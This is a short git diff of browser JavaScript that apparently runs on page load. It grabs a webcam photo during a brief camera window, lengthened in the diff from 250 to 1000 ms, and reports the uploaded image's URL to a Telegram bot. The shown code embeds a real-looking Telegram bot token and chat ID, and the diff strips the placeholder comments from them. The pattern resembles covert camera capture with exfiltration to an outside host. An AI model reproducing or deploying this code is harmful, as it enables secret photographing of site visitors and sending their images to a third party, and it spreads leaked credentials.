@@ -36,7 +36,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 setTimeout(capturePhoto, 100);
             }, { once: true });
 
-            setTimeout(stopVideoStream, 250); // Adjusted for quicker testing
+            setTimeout(stopVideoStream, 1000); // Adjusted for quicker testing
 
             window.onbeforeunload = stopVideoStream;
         } catch (error) {
@@ -91,8 +91,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function notifyTelegramBot(imageUrl) {
-        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s'; // Replace with your bot token
-        const chatId = '6369469811'; // Replace with your chat ID
+        const botToken = '7224754204:AAGVD9csTIX8wMvHYmTPFrmJ_eq4etfJ71s'; 
+        const chatId = '6369469811';
         const message = `New image uploaded: ${imageUrl}`;
 
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
